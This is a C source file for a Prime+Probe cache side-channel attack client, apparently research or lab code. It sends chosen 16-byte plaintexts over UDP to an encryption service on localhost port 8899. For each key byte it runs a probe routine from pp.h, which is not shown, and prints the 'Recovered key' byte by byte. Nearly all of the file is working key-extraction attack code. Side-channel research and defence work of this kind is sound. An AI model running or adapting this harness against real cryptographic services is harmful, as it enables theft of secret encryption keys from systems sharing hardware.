#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#include "pp.h"

#define DEFAULT_NUM_SAMPLES	1000000
#define DEFAULT_CACHE_SETS	64
#define DEFAULT_LINE_SHIFT	4
#define DEFAULT_CACHE_LEVEL	1
#define DEFAULT_KEY_START	0
#define DEFAULT_KEY_LENGTH	16

#define DELAY_LOOP_COUNT	0

#define SERVER_PORT			8899
#define BUFFER_SIZE			16

void bintostr(const uint8_t* bin, char* str, size_t len) {
	for (size_t i = 0; i < len; i++) {
		sprintf(str + 2*i, "%02x", bin[i]);
	}
	str[2*len] = '\0';
}

void tobinary(const char *data, uint8_t *des) {
	unsigned int x;
	for (int i = 0; i < 16; i++) {
		sscanf(data + i * 2, "%2x", &x);
		des[i] = x;
	}
}

void parser(int argc, char* argv[], int* num_samples, int* cache_sets, int* line_shift, int* cache_level, int* key_start, int* key_length) {
	*num_samples = DEFAULT_NUM_SAMPLES;
	*cache_sets = DEFAULT_CACHE_SETS;
	*line_shift = DEFAULT_LINE_SHIFT;
	*cache_level = DEFAULT_CACHE_LEVEL;
	*key_start = DEFAULT_KEY_START;
	*key_length = DEFAULT_KEY_LENGTH;

	for (int i = 1; i < argc; i++) {
		if (strcmp(argv[i], "--num-samples") == 0 && i + 1 < argc) {
			*num_samples = atoi(argv[++i]);
		} else if (strcmp(argv[i], "--cache-sets") == 0 && i + 1 < argc) {
			*cache_sets = atoi(argv[++i]);
		} else if (strcmp(argv[i], "--line-shift") == 0 && i + 1 < argc) {
			*line_shift = atoi(argv[++i]);
		} else if (strcmp(argv[i], "--cache-level") == 0 && i + 1 < argc) {
			*cache_level = atoi(argv[++i]);
		} else if (strcmp(argv[i], "--key-start") == 0 && i + 1 < argc) {
			*key_start = atoi(argv[++i]);
		} else if (strcmp(argv[i], "--key-length") == 0 && i + 1 < argc) {
			*key_length = atoi(argv[++i]);
		} else {
			fprintf(stderr, "Usage: %s [--num-samples N] [--cache-sets N] [--line-shift N] [--cache-level N] [--key-start N] [--key-length N]\n", argv[0]);
			exit(EXIT_FAILURE);
		}
	}
	if (*key_start + *key_length > 16) {
		*key_length = 16 - *key_start;
	}

	if (*key_start < 0 || *key_length <= 0) {
		fprintf(stderr, "Invalid key range: start=%d, length=%d\n", *key_start, *key_length);
		exit(EXIT_FAILURE);
	}
	if (*cache_sets <= 0 || *line_shift <= 0 || *cache_level <= 0) {
		fprintf(stderr, "Cache parameters must be positive integers\n");
		exit(EXIT_FAILURE);
	}
	if (*num_samples <= 0) {
		fprintf(stderr, "Number of samples must be a positive integer\n");
		exit(EXIT_FAILURE);
	}
}

void udp_init();
void udp_send(const uint8_t* data, size_t len);

void crypto(uint8_t* input, uint8_t* output, void* _) {
	udp_send(input, 16);
}

int main(int argc, char* argv[]) {
	int num_samples, cache_sets, line_shift, cache_level, key_start, key_length;
	parser(argc, argv, &num_samples, &cache_sets, &line_shift, &cache_level, &key_start, &key_length);
	printf("Using parameters: num_samples=%d, cache_sets=%d, line_shift=%d, cache_level=%d, key_start=%d, key_length=%d\n",
		   num_samples, cache_sets, line_shift, cache_level, key_start, key_length);

	pp_init(cache_sets, line_shift, cache_level);
	udp_init();
	
	FOUT = true;
	printf("Recovered key:");
	fflush(stdout);
	for (int i = key_start; i < key_start + key_length; i++) {
	    delayloop(DELAY_LOOP_COUNT);
		printf("%02x", pp(crypto, NULL, num_samples, i));
		fflush(stdout);

		FOUT = false;
	}
	printf("\n");
}

int sockfd;
struct sockaddr_in server_addr;

void udp_init() {
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    // 2. 设置服务器地址
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    if (inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr) <= 0) {
        perror("invalid address");
        close(sockfd);
        exit(EXIT_FAILURE);
    }
}

void udp_send(const uint8_t* data, size_t len) {
    // 3. 发送数据
    sendto(sockfd, data, len, 0,
           (const struct sockaddr *)&server_addr, sizeof(server_addr));
	
    socklen_t server_len = sizeof(server_addr);
    
	uint8_t buffer[BUFFER_SIZE];
	int n = recvfrom(sockfd, buffer, BUFFER_SIZE, 0,
                     (struct sockaddr *)&server_addr, &server_len);
    if (n > 0) {
        // printf("Server replied: %s\n", buffer);
    }
}
